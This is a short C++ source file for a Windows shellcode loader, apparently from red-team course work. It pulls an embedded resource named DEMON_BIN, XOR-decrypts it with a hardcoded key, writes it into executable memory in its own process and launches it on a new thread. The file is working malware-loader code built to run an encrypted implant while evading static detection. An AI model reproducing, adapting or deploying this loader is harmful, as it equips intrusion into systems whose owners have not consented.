#include <Windows.h>
#include <cstdio>
#include <iostream>
#include "resource2.h"

// credit: Sektor7 RTO Malware Essential Course 
void XOR(unsigned char* data, size_t data_len, char* key, size_t key_len) {
	int j;

	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int main()
{
	// Resource - Find, load, and copy resource to a char pointer 
	HRSRC scRsrc = FindResource(NULL, MAKEINTRESOURCE(IDR_DEMON_BIN1), L"DEMON_BIN");
	if (scRsrc == NULL) {
		printf("[-] FindResource failed: %d\n", GetLastError());
		return 1;
	}
	DWORD scSize = SizeofResource(NULL, scRsrc);
	HGLOBAL scRsrcData = LoadResource(NULL, scRsrc);
	unsigned char* buf = (unsigned char*)malloc(scSize);
	memcpy(buf, scRsrcData, scSize);

	// VirtualAlloc on self 
	HANDLE hProc = GetCurrentProcess();
	LPVOID hAlloc = (LPVOID)VirtualAlloc(NULL, scSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (hAlloc == NULL) {
		printf("[-] VirtualAlloc failed: %d\n", GetLastError());
		return 1;
	}

	// XOR Decrypt 
	char key[] = "redteamplaybook";
	XOR(buf, scSize, key, sizeof(key));

	// WriteProcessMemory on self 
	SIZE_T* lpNumberOfBytesWritten = 0;
	if (!WriteProcessMemory(hProc, hAlloc, (LPVOID)buf, scSize, lpNumberOfBytesWritten)) {
		printf("[-] WPM failed: %d\n", GetLastError());
		return 1;
	}

	printf("+ WPM: %p\n", hAlloc);

	// CRT and execute the shellcode 
	DWORD threadId = 0;
	HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)hAlloc, NULL, 0, (LPDWORD)(&threadId));
	if (hThread == NULL) {
		printf("[-] CRT failed: %d\n", GetLastError());
		return 1;
	}

	// WaitForSingleObject 
	WaitForSingleObject(hThread, 1000);

	// Self injection, so this process needs to be running as well. Easy and dirty to do that. 
	Sleep(99999999);

	return 0;
}
